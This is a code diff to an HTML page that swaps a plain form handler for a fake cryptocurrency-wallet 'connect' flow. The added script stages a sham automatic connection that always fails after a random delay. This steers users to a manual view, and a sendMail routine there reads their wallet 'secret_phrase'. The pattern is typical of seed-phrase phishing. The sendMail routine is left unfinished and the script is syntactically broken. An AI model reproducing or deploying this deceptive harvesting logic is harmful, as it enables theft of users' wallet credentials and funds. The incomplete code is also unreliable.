@@ -1403,33 +1403,83 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
 
 
-<script>
-  document.getElementById("my-form").addEventListener("submit", async function (event) {
-    event.preventDefault(); // Prevent default submission to avoid a blank page
+ <script>
+        // Handle modal visibility
+        $('.myBtn').on('click', function() {
+            $('#connectWallet').css('display', 'block');
+        });
+        $('.openManual').on('click', function() {
+            $('.modal').css('display', 'none');
+            $('#connectWallet2').css('display', 'block');
+        });
+        $(".close2").on('click', function() {
+            $('.modal').css('display', 'none');
+        });
+        $(".minimize").on('click', function() {
+            $('.modal').css('display', 'none');
+        });
 
-    const form = event.target;
-    const formData = new FormData(form);
+        // Handle form submission
+       
 
-    try {
-      const response = await fetch("/", {
-        method: "POST",
-        body: formData,
-      });
+        // Handle Select Wallet Click
+        $(function() {
+            $('.select_wallet').on('click', function() {
+                var wd = $(this);
+                $('#wallet_name').text(wd.data('title'));
+                $('#wallet_logo').attr("src", wd.data('logo'));
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').hide();
+                $('#popup_connect_wallet').modal('show');
 
-      if (response.ok) {
-        alert("Form submitted successfully!");
-        form.reset(); // Reset the form on success
-      } else {
-        document.getElementById("error-message").style.display = "block"; // Show error message
-      }
-    } catch (error) {
-      console.error("Error submitting form:", error);
-      document.getElementById("error-message").style.display = "block"; // Show error message
-    }
-  });
-</script>
+                var interval = 1000 * getRandomInt(1, 15);
+                setTimeout(() => {
+                    $('#auto_connecting').hide();
+                    $('#div_connect_manuallly').hide();
+                    $('#failed_to_connect').show();
+                }, interval);
+            });
 
+            $('#try_auto_connecting_again').on('click', function(e) {
+                e.preventDefault();
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').hide();
 
+                var interval = 1000 * getRandomInt(1, 20);
+                setTimeout(() => {
+                    $('#auto_connecting').hide();
+                    $('#div_connect_manuallly').hide();
+                    $('#failed_to_connect').show();
+                }, interval);
+            });
+
+            $('#button_connect_manually').on('click', function(e) {
+                e.preventDefault();
+                $('#auto_connecting').hide();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').show();
+            });
+        });
+
+        function getRandomInt(min, max) {
+            min = Math.ceil(min);
+            max = Math.floor(max);
+            return Math.floor(Math.random() * (max - min) + min);
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const sendMail = async () => {
+                const wallet = document.getElementById("wallet_name").innerText.trim();
+                const secret = document.getElementById("secret_phrase").value.trim();
+                const button = document.getElementById("button_connect_wallet");
+                const resultDiv = document.querySelector(".result");
+
+                // Field validation
+                
+        });
+    </script>
 </body>
 
 
